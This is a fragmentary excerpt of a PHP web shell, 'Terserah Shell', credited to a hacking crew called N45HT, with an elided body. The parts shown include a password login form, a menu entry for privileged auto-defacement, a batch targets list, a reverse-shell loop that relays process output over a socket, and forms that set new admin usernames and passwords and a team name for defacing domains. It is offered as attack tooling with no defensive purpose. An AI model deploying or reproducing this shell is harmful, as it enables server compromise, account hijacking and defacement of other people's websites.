...
<fieldset>
        ...
        <form method="post">
<input type="text" name="id" value="N45HT">
</form>
Password
<form method="post">
...
echo "<BR>";
echo "<center><font size='6px' color='lavender'>Terserah Shell >_<</font>";
echo "<br>";
echo "<p>";
...
echo "<li> <a href='?dir=$dir&do=autoklik'>Priv Auto Deface From N45HT</a> </li>";
...
<tr><td><center><font color="gold">Discovering And Exploiting Security Flaws.
    <p><font color="Lavender">Thanks To : Rinto AR , ShinChan , PETR03X , Mr.x0x , IndoXploit, And Member N45HT</font>
<br><a href="https://www.facebook.com/groups/N45HTOfficial/">JOIN TO GROUP OFFICIAL N45HT</a>
    <br><font color="Lavender"><font></font> <br>Terserah Shell Create By LugiX From N45HT Crew
</td></tr>
...
?>
<form method="post">
<input type="submit" name="s" value="N45HT.php">
</form>
<?php
$targets = explode("\r\n", $_POST['targets']);
if($_POST['s']) {
...
if(in_array($pipes[2], $read_a)){$input = fread($pipes[2], $chunk_size);fwrite($sock, $input);}}fclose($sock);fclose($pipes[0]);fclose($pipes[1]);fclose($pipes[2]);proc_close($process);$rsres = " ";$s_result .= $rsres;}
    ...
    if($_POST['hajar']) {
        ...
        Set User & Pass: <br>
        <input type='text' name='user_baru' value='N45HT' placeholder='user_baru'><br>
        <input type='text' name='pass_baru' value='N45HT' placeholder='pass_baru'><br>
...
echo "<center><form method='post'>
        ...
        <u>Team</u>: <br>
        <input type='text' name='tim' size='50' value='N45HT'><br>
        <u>Domains</u>: <br>
